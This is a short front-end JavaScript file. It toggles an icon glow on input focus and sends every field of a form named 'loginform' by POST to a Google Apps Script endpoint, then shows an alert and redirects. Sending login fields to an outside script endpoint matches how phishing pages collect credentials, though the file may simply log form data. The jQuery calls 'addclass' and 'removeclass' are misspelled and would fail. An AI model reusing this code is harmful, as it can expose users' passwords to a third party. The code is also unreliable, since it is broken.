$(".input_text").focus(function(){
    $(this).prev('.fa').addclass('glowIcon')
})
$(".input_text").focusout(function(){
    $(this).prev('.fa').removeclass('glowIcon')
})


// this script is to send < data to database

const scriptURL = 'https://script.google.com/macros/s/AKfycbzAv9mhygyj3sqjy9sPLuWJSngXwzTO55xn-2EhKSP_lHKUB4iLg2VihfG5mOCU5UDC/exec'
            const form = document.forms['loginform']
          
            form.addEventListener('submit', e => {
              e.preventDefault()
              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then( response => alert("Thank you! your form is submitted successfully." ))
                    .then(() => {  window.location.href = "index.html"; })
                .catch(error => console.error('Error!', error.message))
            })